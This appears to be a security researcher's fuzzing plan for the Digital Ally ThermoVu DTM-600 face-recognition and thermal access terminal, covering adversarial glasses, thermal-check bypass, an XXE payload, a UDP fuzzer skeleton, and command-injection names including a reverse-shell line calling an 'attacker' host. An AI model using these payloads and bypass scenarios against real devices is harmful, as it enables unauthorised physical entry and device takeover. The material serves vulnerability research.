# DTM-600 Face Recognition Pipeline Fuzzing Framework

**Purpose:** Security research framework for identifying vulnerabilities in the face recognition pipeline
**Target:** Digital Ally ThermoVu DTM-600 (OET-213H-NB)
**Scope:** Code execution, authentication bypass, DoS, command injection

---

## 1. Attack Surface Map

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           PHYSICAL LAYER                                    │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │ RGB Camera  │  │ IR Thermal  │  │  IR Flood   │  │   Display   │        │
│  │  (1080p)    │  │   Sensor    │  │   LEDs      │  │  (touch)    │        │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘        │
└─────────┼────────────────┼────────────────┼────────────────┼────────────────┘
          │                │                │                │
          ▼                ▼                ▼                ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           SENSOR PROCESSING                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │  VI_CAP0 (Video Input) → ISP → Frame Buffer → NNIE Queue            │    │
│  │  Attack: Malformed frame injection, timing attacks, overflow         │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                        NEURAL NETWORK LAYER (NNIE)                          │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐          │
│  │ Detect   │→│ Align    │→│ Quality  │→│ Liveness │→│ Feature  │          │
│  │ (YOLO)   │ │ (5-pt)   │ │ (angle)  │ │ (2-model)│ │ (256-d)  │          │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘          │
│  Attack: Adversarial examples, model confusion, tensor overflow             │
└─────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         APPLICATION LAYER                                    │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐                   │
│  │  mwareserver  │  │  mmi_client   │  │  libFaceAPI   │                   │
│  │  (main proc)  │  │  (GUI/audio)  │  │  (analysis)   │                   │
│  └───────────────┘  └───────────────┘  └───────────────┘                   │
│  Attack: IPC fuzzing, config injection, memory corruption                   │
└─────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                          OUTPUT LAYER                                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐                    │
│  │ Door     │  │ Wiegand  │  │ Audio    │  │ Network  │                    │
│  │ Relay    │  │ (26/34)  │  │ (PCM)    │  │ (LAPI)   │                    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘                    │
│  Attack: Replay, protocol fuzzing, timing sidechannels                      │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Fuzzing Vectors

### 2.1 VECTOR A: Adversarial Image Attacks (Physical)

**Goal:** Cause misclassification, false positive, or crash via camera input

#### A1: Rapid Image Flashing Attack
```
Theory: Rapidly alternating images at specific frequencies may:
- Cause frame buffer race conditions
- Overflow the NNIE processing queue
- Trigger timing-based vulnerabilities in face tracking

Implementation:
┌─────────────────────────────────────────────────────────────────┐
│  Screen/Projector facing camera                                 │
│  ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐      │
│  │ Face A  │ →  │ Noise   │ →  │ Face B  │ →  │ Pattern │      │
│  │ (valid) │    │ (random)│    │ (target)│    │ (advers)│      │
│  └─────────┘    └─────────┘    └─────────┘    └─────────┘      │
│      16ms          16ms           16ms           16ms          │
│      (60fps alternation)                                        │
└─────────────────────────────────────────────────────────────────┘

Parameters to fuzz:
- Flash frequency: 1Hz - 120Hz
- Image sequence: [enrolled_face, target_face, noise, patterns]
- Transition type: hard cut, fade, partial overlay
- Duration per frame: 1ms - 100ms
```

#### A2: Adversarial Patch Attack
```
Theory: Specially crafted patterns that exploit NN model weaknesses

Targets:
1. YOLO detector: Patches that suppress face detection
2. Alignment model: Patches that shift landmark positions
3. Liveness model: Patterns that trigger "live" classification
4. Feature model: Patches that shift embedding toward target

Implementation:
┌─────────────────────────────────────────────────────────────────┐
│  Physical adversarial accessories:                               │
│  - Eyeglass frames with adversarial patterns                    │
│  - Hat/headband with printed patches                            │
│  - Face mask with strategic markings                            │
│  - Projected IR patterns (invisible to human)                   │
└─────────────────────────────────────────────────────────────────┘

Generation approach:
1. Extract model weights from faceDetect_yolo_h512_w288_r37_3516x
2. Use PGD/FGSM to generate adversarial perturbations
3. Convert to printable patterns accounting for camera response
4. Test physical realizability with color/lighting variations
```

#### A3: IR Spectrum Attack
```
Theory: IR sensors and flood LEDs may be manipulated

Attack vectors:
1. IR LED flooding: Overwhelm thermal sensor with external IR
2. IR pattern injection: Project patterns visible only to IR camera
3. Thermal spoofing: Use heating elements to fake body temperature

Target the temperature check bypass:
- Normal range: 34.0°C - 37.3°C
- Environment compensation: +5°C at 5°C ambient
- Attack: Cool face to low temp, trigger +5°C compensation = appear normal
```

#### A4: Liveness Bypass via Display Attack
```
Theory: Defeat liveness detection with specific display characteristics

Current config: Liveness DISABLED (Enable=0)
If enabled, attack the STM (spatio-temporal) model:

1. 3D mask with subtle motorized movements
2. High-refresh display (120Hz+) with synthetic motion
3. Lenticular display showing different angles
4. Video of target with added micro-movements

Frame injection timing:
- Model expects temporal consistency over N frames
- Inject target face at frame N-1, N, N+1 with slight variations
- Ensure motion vectors appear natural
```

---

### 2.2 VECTOR B: Neural Network Model Fuzzing

**Goal:** Crash NNIE runtime, cause memory corruption, trigger undefined behavior

#### B1: Malformed Input Tensor Attack
```
Theory: NNIE models expect specific input dimensions/formats

faceDetect_yolo_h512_w288 expects:
- Input: 512 x 288 x 3 (HWC format)
- Type: uint8 or float32

Fuzz approach:
1. Intercept frame buffer before NNIE submission
2. Inject malformed tensors:
   - Wrong dimensions (513 x 288, 512 x 0, negative values)
   - NaN/Inf float values
   - Integer overflow values (0xFFFFFFFF)
   - Null pointer as tensor data

Implementation via root shell:
┌─────────────────────────────────────────────────────────────────┐
│ # Locate frame buffer in /dev/mem or /proc/[pid]/mem           │
│ # Map mwareserver memory space                                  │
│ # Find NNIE input queue structures                              │
│ # Inject malformed tensor descriptors                           │
└─────────────────────────────────────────────────────────────────┘
```

#### B2: Model File Corruption
```
Theory: Corrupt model files to trigger parsing vulnerabilities

Targets in /program/factory/models/model/:
- faceRec_4110_fc256_Model_r37_3516x (65 MB)
- All .wk (compiled NNIE model) files

Fuzz approach:
1. Remount /program as RW: mount -o remount,rw /program
2. Bit-flip model file headers
3. Truncate model files mid-layer
4. Replace layer weights with adversarial values
5. Corrupt metadata (layer count, dimensions)

Test cases:
- Magic number corruption
- Layer descriptor overflow
- Weight matrix dimension mismatch
- Activation function index OOB
```

#### B3: Feature Vector Injection
```
Theory: Manipulate 256-dim feature vectors to bypass matching

Feature storage: /data/WorkLibFile/{LibID}/FeatureLib.bin

Attack approach:
1. Extract enrolled face features
2. Craft universal feature vector that matches multiple templates
3. Inject into face database
4. Alternatively, corrupt comparison function via memory manipulation

Universal feature hypothesis:
- Find feature vector that has >82% similarity to all templates
- May exist in high-dimensional space (256-dim)
- Use gradient-based optimization against extracted model
```

---

### 2.3 VECTOR C: Protocol & IPC Fuzzing

**Goal:** Remote code execution, command injection via network services

#### C1: ONVIF/SOAP Fuzzing (Port 81)
```
Theory: ONVIF implementation may have XML parsing vulnerabilities

Fuzz targets:
1. XML entity expansion (billion laughs)
2. XPath injection in search queries
3. Buffer overflow in string parameters
4. Integer overflow in numeric fields

Tool: Use existing ONVIF fuzzer or custom SOAP payloads

Example XXE payload:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body>
    <GetDeviceInformation>&xxe;</GetDeviceInformation>
  </s:Body>
</s:Envelope>
```

#### C2: Face Enrollment API Injection
```
Theory: Face enrollment accepts user-provided data (name, ID, etc.)

Potential injection points:
- Person name field → command injection in log/display
- Card number field → SQL injection if database backed
- Photo data → image parser vulnerabilities

Test via LAPI (port 80) or SDK (port 49152):

POST /LAPI/V1.0/PeopleLibraries/3/People
{
  "PersonName": "$(whoami)",
  "PersonName": "'; DROP TABLE faces; --",
  "PersonName": "<script>alert(1)</script>",
  "CardNo": "../../../etc/passwd",
  "FaceData": [malformed_base64_jpeg]
}
```

#### C3: IPC Message Fuzzing
```
Theory: Inter-process communication may lack validation

Key functions from binary analysis:
- BP_SendAsyncMsg()
- BP_SendSyncGetMsg()
- BP_SendResponseMsg()

Message command IDs observed:
- 3141, 4045, 4246 (config operations)
- MW_CMD_* constants

Fuzz approach via root shell:
1. Trace IPC: strace -e sendmsg,recvmsg -p $(pidof mwareserver)
2. Identify message queue / socket
3. Inject malformed messages:
   - Invalid command IDs
   - Oversized payloads
   - Type confusion (string as int)
   - Null terminators in middle of string
```

#### C4: UDP/7788 Extended Fuzzing
```
Theory: Already known vulnerable (CVE-2021-45039), may have more bugs

Beyond known overflow, fuzz for:
1. Other command codes in maintain protocol
2. Authentication bypass sequences
3. Format string vulnerabilities
4. Integer overflows in length fields

Fuzzer skeleton:
import socket
import struct

def fuzz_maintain(target, port=7788):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Command structure hypothesis based on CVE
    for cmd in range(0, 256):
        for length in [0, 1, 0x7F, 0x80, 0xFF, 0xFFFF]:
            payload = struct.pack("<BBH", cmd, 0, length)
            payload += b"A" * length
            sock.sendto(payload, (target, port))
```

---

### 2.4 VECTOR D: Configuration Injection

**Goal:** Modify runtime behavior via malformed configs

#### D1: XML Config Parsing Fuzz
```
Theory: config_a.xml parsing may have vulnerabilities

Injection points (writable /config/ partition):
1. Oversized field values
2. Deeply nested XML structures
3. Entity expansion
4. Encoding attacks (UTF-8 overlong)

Test approach:
1. Backup: cp /config/config_a.xml /config/config_a.xml.bak
2. Inject fuzzed values
3. Trigger config reload: reboot or signal mwareserver
4. Monitor for crash/unexpected behavior
```

#### D2: Face Template Corruption
```
Theory: Corrupt face database to trigger comparison bugs

Target files:
/data/WorkLibFile/AllLibInfo.bin
/data/WorkLibFile/3/LibKeyInfo.bin
/data/WorkLibFile/3/FeatureLib.bin (if exists)

Corruption tests:
1. Entry count mismatch (header says 10, only 5 entries)
2. Feature dimension mismatch (expect 256, provide 512)
3. Negative similarity scores in pre-computed cache
4. Circular references in linked structures
```

---

### 2.5 VECTOR E: Timing & Side-Channel Attacks

**Goal:** Extract information or bypass checks via timing analysis

#### E1: Recognition Timing Oracle
```
Theory: Matching time may leak information about database contents

Attack:
1. Present unknown face to camera
2. Measure time to "Access Denied"
3. Correlate with:
   - Number of enrolled templates
   - Similarity to enrolled faces (early-exit optimization)

If early-exit exists:
- Fast rejection = very dissimilar (low similarity)
- Slow rejection = close match but below threshold
- Use to enumerate enrolled faces or find near-matches
```

#### E2: Template Extraction via Power Analysis
```
Theory: NNIE power consumption may leak model operations

Requires: Physical access to power rail or EM probe

Approach:
1. Capture power traces during face recognition
2. Identify feature extraction phase
3. Correlate power patterns with known inputs
4. Extract weight values or intermediate activations
```

---

## 3. Fuzzing Infrastructure

### 3.1 Test Harness Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         FUZZING CONTROLLER (Host)                           │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Orchestrator                                                        │   │
│  │  - Test case generation (AFL, libFuzzer, custom)                    │   │
│  │  - Device state monitoring                                           │   │
│  │  - Crash detection & triage                                          │   │
│  │  - Coverage tracking (if possible)                                   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│              │                    │                    │                    │
│              ▼                    ▼                    ▼                    │
│  ┌───────────────┐    ┌───────────────┐    ┌───────────────┐              │
│  │ Physical      │    │ Network       │    │ Memory        │              │
│  │ Stimulus      │    │ Fuzzer        │    │ Injector      │              │
│  │ (display/IR)  │    │ (ONVIF/UDP)   │    │ (via root)    │              │
│  └───────┬───────┘    └───────┬───────┘    └───────┬───────┘              │
└──────────┼────────────────────┼────────────────────┼────────────────────────┘
           │                    │                    │
           ▼                    ▼                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                            DTM-600 TARGET                                    │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Monitoring Agent (via root shell)                                   │   │
│  │  - Process watchdog: while true; do pidof mwareserver || echo CRASH; │   │
│  │  - Memory monitor: watch -n1 'cat /proc/meminfo'                    │   │
│  │  - Log capture: tail -f /data/log/*.log                             │   │
│  │  - Core dump capture (if enabled)                                    │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Physical Fuzzing Rig

```
Components needed:
1. High-refresh display (120Hz+) or projector
2. Motorized mount for precise positioning
3. IR LED array (850nm, 940nm)
4. Heating element for thermal spoofing
5. Raspberry Pi for image sequencing
6. Camera to record device reactions

Setup:
┌─────────────────────────────────────────────────────────────────┐
│                                                                  │
│    [Display/Projector]          [DTM-600]          [Observer]   │
│         │                          │                    │        │
│         │     ←── 30-50cm ──→     │                    │        │
│         │                          │                    │        │
│    [IR Array]                 [Serial Console]    [Network]     │
│         │                          │                    │        │
│         └──────────────────────────┼────────────────────┘        │
│                                    │                             │
│                           [Fuzzing Controller]                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Monitoring Script

```bash
#!/bin/sh
# monitor.sh - Run on DTM-600 via root shell

LOG_DIR="/tmp/fuzz_logs"
mkdir -p $LOG_DIR

# Process watchdog
while true; do
    if ! pidof mwareserver > /dev/null; then
        echo "[$(date)] CRASH: mwareserver died" >> $LOG_DIR/crashes.log
        # Capture any core dump
        cp /tmp/core.* $LOG_DIR/ 2>/dev/null
        # Restart for next test
        /program/bin/mwareserver &
    fi
    sleep 1
done &

# Memory monitor
while true; do
    free | grep Mem >> $LOG_DIR/memory.log
    echo "---" >> $LOG_DIR/memory.log
    sleep 5
done &

# Log aggregator
tail -f /data/Log/*.log >> $LOG_DIR/app.log 2>/dev/null &

# Network traffic capture (if tcpdump available)
# tcpdump -i eth0 -w $LOG_DIR/traffic.pcap &

echo "Monitoring started. Logs in $LOG_DIR"
```

---

## 4. Specific Attack Scenarios

### 4.1 Scenario: Authentication Bypass via Adversarial Glasses

```
Objective: Gain access as enrolled user without being that person

Approach:
1. Obtain photo of enrolled user (social media, badge photo)
2. Extract facial features using same model architecture
3. Generate adversarial perturbation targeting enrolled embedding
4. Print perturbation on eyeglass frames or face mask
5. Wear glasses, approach camera
6. Perturbation shifts extracted features toward enrolled user
7. Similarity exceeds 82% threshold → door opens

Feasibility: HIGH if model weights extractable, MEDIUM otherwise
```

### 4.2 Scenario: DoS via Frame Buffer Exhaustion

```
Objective: Crash or hang the device by exhausting resources

Approach:
1. Present rapidly changing multi-face images
2. Each face triggers detection → alignment → feature extraction
3. NNIE queue fills faster than processing
4. Memory exhaustion or queue overflow

Test sequence:
- Frame 1: 10 faces at different scales
- Frame 2: Same 10 faces, shifted positions
- Frame 3: 10 different faces
- Repeat at 60fps

Expected behavior:
- Queue overflow → crash
- Memory exhaustion → OOM killer
- Race condition → undefined state
```

### 4.3 Scenario: Command Injection via Person Name

```
Objective: Execute arbitrary commands when name is displayed/logged

Attack vector:
1. Enroll face with malicious name via API
2. Name contains shell metacharacters: `$(reboot)` or `; nc attacker 4444 -e /bin/sh`
3. When face recognized, name passed to display function
4. If name passed to shell (logging, display, etc.) → command execution

Test names:
- $(id)
- `id`
- |id
- ;id
- ${IFS}id
- %0aid
- ../../../etc/passwd
```

### 4.4 Scenario: Thermal Check Bypass

```
Objective: Pass temperature check with fever (>37.3°C)

Exploit: Environment compensation lookup table

Attack:
1. Cool the environment sensor (blow cold air on device)
2. Device reads low ambient temp → applies positive compensation
3. At 5°C ambient → +5°C compensation applied to reading
4. Actual 38°C body → reads as 38°C → compensation → system thinks ambient is cold
5. Alternative: Heat face surface with IR lamp briefly before scan

Implementation:
- Ice pack on device housing (target ambient sensor)
- Wait for environment compensation to kick in
- Approach for face scan
- Body temp 38°C appears as 38°C - adjustment = normal range
```

---

## 5. Expected Vulnerabilities

Based on architecture analysis, likely to find:

| Vector | Vulnerability Type | Likelihood | Impact |
|--------|-------------------|------------|--------|
| Adversarial images | Auth bypass | HIGH | Critical |
| Model file corruption | DoS/crash | HIGH | High |
| ONVIF XML parsing | RCE | MEDIUM | Critical |
| IPC message fuzzing | Memory corruption | MEDIUM | High |
| Face enrollment API | Command injection | MEDIUM | Critical |
| Config XML parsing | DoS | HIGH | Medium |
| UDP/7788 extended | RCE | HIGH | Critical |
| Timing oracle | Info disclosure | MEDIUM | Low |
| Feature vector injection | Auth bypass | MEDIUM | Critical |
| Frame buffer overflow | DoS/RCE | LOW | Critical |

---

## 6. Tools & Resources Needed

### Software
- AFL++/libFuzzer for protocol fuzzing
- Boofuzz for network protocol fuzzing
- Foolbox/ART for adversarial example generation
- Ghidra/IDA for binary analysis
- JTAG debugger software (if hardware debug available)

### Hardware
- High-speed display (120Hz+)
- IR LED array with controller
- Thermal camera for verification
- Logic analyzer for Wiegand sniffing
- Oscilloscope for power analysis (optional)

### Access Requirements
- Root shell on device (already have via CVE-2023-0773)
- Network access to all ports
- Physical access to camera lens
- Extracted model files (already have)

---

## 7. Prioritized Test Plan

1. **Week 1: Low-hanging fruit**
   - ONVIF/SOAP XML fuzzing
   - UDP/7788 extended fuzzing
   - Face enrollment API injection testing

2. **Week 2: Physical attacks**
   - Rapid image flashing DoS
   - Basic adversarial patterns
   - IR flooding tests

3. **Week 3: Model attacks**
   - Feature vector extraction attempt
   - Adversarial example generation
   - Model file corruption tests

4. **Week 4: Deep analysis**
   - IPC protocol reverse engineering
   - Memory corruption hunting
   - Timing side-channel analysis
